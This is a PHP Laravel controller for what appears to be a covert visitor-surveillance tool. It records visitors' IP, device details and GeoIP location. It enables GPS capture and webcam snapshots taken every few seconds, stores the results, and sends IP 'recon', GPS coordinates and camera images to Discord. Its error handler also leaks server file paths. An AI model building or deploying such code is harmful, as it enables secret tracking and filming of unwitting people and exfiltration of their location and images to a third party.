<?php

namespace App\Http\Controllers;

use App\Models\Setting;
use App\Models\VisitorLog;
use App\Models\VisitorSnapshot;
use App\Services\DiscordService;
use App\Services\GeoIpService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class TelemetryController extends Controller
{
    public function __construct(
        protected DiscordService $discordService,
        protected GeoIpService $geoIpService
    ) {}

    public function init(Request $request): JsonResponse
    {
        $ip = $request->header('CF-Connecting-IP')
            ?: $request->header('X-Forwarded-For')
            ?: $request->ip();

        // If multiple IPs in forwarded-for, grab the first one
        if (str_contains($ip, ',')) {
            $ip = trim(explode(',', $ip)[0]);
        }

        $uuid = $request->input('uuid') ?: (string) Str::uuid();

        // Fetch Server-side GeoIP
        $geo = $this->geoIpService->lookup($ip);

        $log = VisitorLog::updateOrCreate(
            ['uuid' => $uuid],
            [
                'ip' => $ip,
                'user_agent' => $request->header('User-Agent') ?: $request->input('user_agent'),
                'platform' => $request->input('platform'),
                'browser_name' => $request->input('browser_name'),
                'browser_language' => $request->input('browser_language'),
                'ram' => $request->input('ram'),
                'cpu_cores' => $request->input('cpu_cores'),
                'screen_resolution' => $request->input('screen_resolution'),
                'referrer' => $request->input('referrer') ?: $request->header('referer'),
                'continent' => $geo['continent'] ?? null,
                'country' => $geo['country'] ?? null,
                'country_code' => $geo['countryCode'] ?? null,
                'region_name' => $geo['regionName'] ?? null,
                'city' => $geo['city'] ?? null,
                'zip' => $geo['zip'] ?? null,
                'isp' => $geo['isp'] ?? null,
                'org' => $geo['org'] ?? null,
                'timezone' => $geo['timezone'] ?? null,
                'ip_lat' => isset($geo['lat']) ? (float)$geo['lat'] : null,
                'ip_lon' => isset($geo['lon']) ? (float)$geo['lon'] : null,
            ]
        );

        // Send Discord notifications
        $this->discordService->sendSystemInfo($log);
        $this->discordService->sendIpRecon($log, $geo);

        return response()->json([
            'status' => 'ok',
            'uuid' => $uuid,
            'config' => [
                'gps_enabled' => Setting::get('capture_gps_enabled', '1') === '1',
                'cam_enabled' => Setting::get('capture_cam_enabled', '1') === '1',
                'cam_interval' => (int) Setting::get('cam_interval_ms', '2500'),
                'max_snapshots' => (int) Setting::get('max_snapshots_per_session', '5'),
            ]
        ]);
    }

    public function location(Request $request): JsonResponse
    {
        $uuid = $request->input('uuid');
        $log = VisitorLog::where('uuid', $uuid)->first();

        if (!$log) {
            $log = VisitorLog::create([
                'uuid' => $uuid ?: (string) Str::uuid(),
                'ip' => $request->ip(),
            ]);
        }

        if ($request->boolean('denied') || $request->has('error')) {
            $errorMsg = $request->input('error', 'User denied geolocation permission');
            $log->update(['gps_error' => $errorMsg]);
            $this->discordService->sendGpsDenied($log, $errorMsg);

            return response()->json(['status' => 'acknowledged_error']);
        }

        $lat = $request->input('latitude');
        $lon = $request->input('longitude');
        $acc = $request->input('accuracy');

        if ($lat !== null && $lon !== null) {
            $log->update([
                'gps_lat' => (float)$lat,
                'gps_lon' => (float)$lon,
                'gps_accuracy' => $acc !== null ? (float)$acc : null,
                'gps_captured_at' => now(),
                'gps_error' => null,
            ]);

            $this->discordService->sendGpsLocation($log);
        }

        return response()->json(['status' => 'ok']);
    }

    public function snapshot(Request $request): JsonResponse
    {
        try {
            $uuid = $request->input('uuid');
            $log = VisitorLog::where('uuid', $uuid)->first();

            if (!$log) {
                $log = VisitorLog::create([
                    'uuid' => $uuid ?: (string) Str::uuid(),
                    'ip' => $request->ip(),
                ]);
            }

            $maxSnapshots = (int) Setting::get('max_snapshots_per_session', '5');
            $currentCount = $log->snapshots()->count();

            if ($currentCount >= $maxSnapshots) {
                return response()->json(['status' => 'limit_reached']);
            }

            if ($request->hasFile('image')) {
                $file = $request->file('image');

                if (!$file->isValid()) {
                    return response()->json(['status' => 'invalid_image_upload', 'error' => $file->getErrorMessage()], 400);
                }

                $filename = 'snap_' . $uuid . '_' . time() . '_' . Str::random(4) . '.webp';
                $path = $file->storeAs('snapshots', $filename, 'public');
                
                $absolutePath = storage_path('app/public/' . $path);
                
                if (!file_exists($absolutePath)) {
                    throw new \Exception("File was not saved properly to " . $absolutePath);
                }
                
                $base64 = base64_encode(file_get_contents($absolutePath));

                $snapshot = VisitorSnapshot::create([
                    'visitor_log_id' => $log->id,
                    'uuid' => $log->uuid,
                    'file_path' => $path,
                    'image_base64' => $base64,
                ]);

                $this->discordService->sendSnapshot($log, $absolutePath);

                return response()->json([
                    'status' => 'ok',
                    'snapshot_id' => $snapshot->id,
                    'count' => $currentCount + 1
                ]);
            }

            return response()->json(['status' => 'no_image_provided'], 400);
        } catch (\Throwable $e) {
            return response()->json([
                'status' => 'error',
                'message' => $e->getMessage(),
                'file' => $e->getFile(),
                'line' => $e->getLine()
            ], 200);
        }
    }
}
